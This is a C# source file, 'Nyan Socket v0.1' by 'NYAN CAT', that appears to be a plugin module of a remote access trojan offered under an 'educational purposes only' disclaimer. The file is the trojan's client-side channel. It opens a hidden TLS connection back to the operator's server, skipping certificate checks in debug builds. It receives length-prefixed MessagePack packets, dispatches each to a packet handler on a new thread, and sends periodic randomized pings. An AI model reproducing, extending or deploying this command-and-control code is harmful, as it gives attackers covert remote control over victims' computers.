using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.Security.Principal;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using MessagePackLib.MessagePack;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Plugin
{
    public class TempSocket
    {
        public Socket TcpClient { get; set; }
        public SslStream SslClient { get; set; }
        private byte[] Buffer { get; set; }
        private static long HeaderSize { get; set; }
        private static long Offset { get; set; }
        public bool IsConnected { get; set; }
        private object SendSync { get; } = new object();
        private static Timer Tick { get; set; }


        public TempSocket()
        {
            if (!Connection.IsConnected) return;

            try
            {
                TcpClient = new System.Net.Sockets.Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                TcpClient.Connect(Connection.TcpClient.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Connection.TcpClient.RemoteEndPoint.ToString().Split(':')[1]));

                Debug.WriteLine("Temp Connected!");
                IsConnected = true;
                SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                HeaderSize = 4;
                Buffer = new byte[HeaderSize];
                Offset = 0;
                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Temp Disconnected!");
                Dispose();
                IsConnected = false;
            }
        }

        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Connection.ServerCertificate.Equals(certificate);
        }

        public void Dispose()
        {
            IsConnected = false;

            try
            {
                TcpClient.Shutdown(SocketShutdown.Both);
            }
            catch { }

            try
            {
                Tick?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
            catch { }
        }

        public void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        Debug.WriteLine("/// Plugin Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || !Connection.IsConnected)
                    {
                        Dispose();
                        return;
                    }
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                            }
                        }
                    }
                    else
                    {
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                }
                catch
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
        }

        public void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = "";
            Send(msgpack.Encode2Bytes());
        }
    }
}